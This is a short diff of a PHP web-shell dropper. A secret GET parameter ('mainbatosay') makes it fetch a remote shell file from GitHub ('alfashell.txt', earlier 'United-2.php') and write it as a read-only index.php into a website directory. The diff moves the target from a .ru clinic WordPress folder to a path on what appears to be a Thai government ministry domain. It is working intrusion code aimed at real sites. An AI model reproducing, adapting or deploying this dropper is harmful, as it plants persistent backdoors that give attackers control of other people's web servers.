@@ -1,10 +1,10 @@
 <?php
 
 if (isset($_GET['mainbatosay'])) {
-    $dirPath = '/home/c/cvpclinic/melsytechclinics.ru/public_html/wp-content';
-    $filePath = $dirPath . '/1337.php';
+    $dirPath = '/home/admin/domains/ministeroffice.moph.go.th/public_html/images/employee/Politics';
+    $filePath = $dirPath . '/index.php';
 
-    $url = 'https://raw.githubusercontent.com/CallMeBatosay/ShellBypass/main/United-2.php';
+    $url = 'https://raw.githubusercontent.com/kurtcobain555/fileshell/main/alfashell.txt?token=GHSAT0AAAAAACUAWJI34FEXYEPWW2ESQDRQZT2T7OQ';
 
     $desiredPermission = 0444;
 
